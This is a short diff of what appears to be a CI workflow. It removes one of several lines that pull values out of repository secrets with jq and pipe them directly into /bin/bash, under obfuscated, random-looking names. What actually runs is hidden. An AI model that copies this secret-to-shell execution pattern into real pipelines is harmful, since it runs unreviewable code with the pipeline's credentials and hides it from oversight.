@@ -19,7 +19,6 @@ jobs:
           g2: ${{ secrets.g2 }}
         run: |
           printf '%s' "$g2" | jq -r .v40482 | /bin/bash
-          echo $k78120 | jq -r .akvo3 | /bin/bash
           printf '%s' "$ljck730" | jq -r .jjwu385 | /bin/bash
           echo $knpet1287 | jq -r .bng766 | /bin/bash
 
